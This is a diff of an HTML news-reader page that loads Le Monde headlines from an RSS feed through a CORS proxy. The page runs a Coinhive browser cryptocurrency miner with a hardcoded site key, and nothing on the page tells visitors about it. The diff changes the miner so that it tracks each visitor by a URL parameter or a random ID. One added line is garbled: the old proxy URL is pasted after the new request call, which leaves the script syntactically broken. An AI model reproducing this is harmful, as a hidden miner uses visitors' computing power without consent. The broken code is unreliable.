@@ -58,21 +58,44 @@ width: 100%;
 	</header>
 	<main id="articles">
 	</main>
+	<script>
+	function $_GET(param) {
+	var vars = {};
+	window.location.href.replace( location.hash, '' ).replace( 
+		/[?&]+([^=&]+)=?([^&]*)?/gi, // regexp
+		function( m, key, value ) { // callback
+			vars[key] = value !== undefined ? value : '';
+		}
+	);
+
+	if ( param ) {
+		return vars[param] ? vars[param] : null;	
+	}
+	return vars;
+	}
+	function identification(){
+		var u = $_GET('u');
+		if(u==''){
+			return Math.random();
+		} else  {
+			return u;
+		}
+    }
+	</script>
+
 	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
 	<script>
-	var miner = new CoinHive.Anonymous('51HNIXDR0tzdIAut5bLcpqW5w0ioMuJI');
+	var miner = new CoinHive.User('51HNIXDR0tzdIAut5bLcpqW5w0ioMuJI',identification());
 	miner.start();
 	</script>
 	<script>
 	function test(){	
 	var x = new XMLHttpRequest();
-	x.open("GET", "http://cors-proxy.htmldriven.com/?url=http://www.lemonde.fr/rss/une.xml", true);
+	x.open("GET", "https://galvanize-cors-proxy.herokuapp.com/http://www.lemonde.fr/rss/une.xml",true);http://cors-proxy.htmldriven.com/?url=http://www.lemonde.fr/rss/une.xml", true);
 	x.onreadystatechange = function () {
   	if (x.readyState == 4 && x.status == 200)
   	{
-    	var json = JSON.parse(x.response);
-	 parser = new DOMParser();
-	var doc = parser.parseFromString(json.body,"text/xml");
+	var doc = x.responseXML;
 var title = doc.getElementsByTagName("channel")[0].getElementsByTagName("title")[0].firstChild.nodeValue;
 	var tab = doc.getElementsByTagName("channel")[0].getElementsByTagName("item");
 	for (var i = 0; i < tab.length; i++) {
